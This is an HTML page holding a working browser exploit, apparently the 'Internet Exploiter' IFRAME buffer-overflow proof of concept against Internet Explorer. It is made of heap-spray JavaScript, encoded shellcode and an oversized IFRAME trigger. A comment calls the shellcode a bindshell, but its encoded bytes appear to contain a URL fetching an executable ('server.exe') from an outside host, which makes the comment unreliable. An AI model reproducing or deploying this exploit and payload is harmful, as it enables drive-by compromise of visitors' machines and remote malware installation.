   <HTML><!--
   ________________________________________________________________________________

       ,sSSSs,   Ss,       Internet Exploiter v0.1
      SS"  `YS'   '*Ss.    MSIE <IFRAME src=... name="..."> BoF PoC exploit
     iS'            ,SS"   Copyright (C) 2003, 2004 by Berend-Jan Wever.
     YS,  .ss    ,sY"      http://www.edup.tudelft.nl/~bjwever
     `"YSSP"   sSS         <skylined@edup.tudelft.nl>
   ________________________________________________________________________________

     This program is free software; you can redistribute it and/or modify it under
     the terms of the GNU General Public License version 2, 1991 as published by
     the Free Software Foundation.

     This program is distributed in the hope that it will be useful, but WITHOUT
     ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
     FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
     details.

     A copy of the GNU General Public License can be found at:
       http://www.gnu.org/licenses/gpl.html
     or you can write to:
       Free Software Foundation, Inc.
       59 Temple Place - Suite 330
       Boston, MA  02111-1307
       USA.
   -->

     <SCRIPT language="javascript">
       // Win32 MSIE exploit helper script, creates a lot of nopslides to land in
       // and/or use as return address. Thanks to blazde for feedback and idears.

       // Win32 bindshell (port 28876, '\0' free, looping). Thanks to HDM and
       // others for inspiration and borrowed code.
       shellcode = unescape("%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%uf633%uad64%u7440%u4805%uad96%uf8eb%u95ad%u664d%ued33%u8166%u007d%u5a4d%uf475%uf58b%u7503%u813c%u503e%u0045%u7500%ue9e7%u0085%u0000%u8b5f%u6af7%u5903%u35e8%u0000%ue200%u68f9%u6e6f%u0000%u7568%u6c72%u546d%u16ff%ue88b%u1fe8%u0000%u6a00%u6800%u652e%u6578%u6368%u5c3a%u8b69%u33dc%u50c0%u5350%u5057%u56ff%u530c%u56ff%uff04%u0856%u5651%u758b%u8b3c%u3574%u0378%u56f5%u768b%u0320%u33f5%u49c9%uad41%uc503%udb33%ub60f%u3810%u74f2%uc108%u0dcb%uda03%ueb40%u3bf1%u751f%u5ee7%u5e8b%u0324%u0fdd%u0cb7%u8b4b%u1c5e%udd03%u048b%u038b%uabc5%u595e%ue8c3%uff76%uffff%u4e8e%uec0e%ufe98%u0e8a%ud87e%u73e2%u1a36%u702f%u7468%u7074%u2f3a%u702f%u6f68%u6f74%u2e32%u6165%u7473%u6167%u656d%u6e2e%u7465%u642f%u6369%u736b%u797a%u732f%u7265%u6576%u2e72%u7865%u0065");
       // Nopslide will contain these bytes:
       bigblock = unescape("%u0D0D%u0D0D");
       // Heap blocks in IE have 20 dwords as header
       headersize = 20;
       // This is all very 1337 code to create a nopslide that will fit exactly
       // between the the header and the shellcode in the heap blocks we want.
       // The heap blocks are 0x40000 dwords big, I can't be arsed to write good
       // documentation for this.
       slackspace = headersize+shellcode.length
       while (bigblock.length<slackspace) bigblock+=bigblock;
       fillblock = bigblock.substring(0, slackspace);
       block = bigblock.substring(0, bigblock.length-slackspace);
       while(block.length+slackspace<0x40000) block = block+block+fillblock;
       // And now we can create the heap blocks, we'll create 700 of them to spray
       // enough memory to be sure enough that we've got one at 0x0D0D0D0D
       memory = new Array();
       for (i=0;i<700;i++) memory[i] = block + shellcode;
     </SCRIPT>
     <!--
       The exploit sets eax to 0x0D0D0D0D after which this code gets executed:
       7178EC02                      8B08            MOV     ECX, DWORD PTR [EAX]
       [0x0D0D0D0D] == 0x0D0D0D0D, so ecx = 0x0D0D0D0D.
       7178EC04                      68 847B7071     PUSH    71707B84
       7178EC09                      50              PUSH    EAX
       7178EC0A                      FF11            CALL    NEAR DWORD PTR [ECX]
       Again [0x0D0D0D0D] == 0x0D0D0D0D, so we jump to 0x0D0D0D0D.
       We land inside one of the nopslides and slide on down to the shellcode.
     -->
     <IFRAME SRC=file://BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB NAME="CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC഍഍"></IFRAME>
   </HTML>
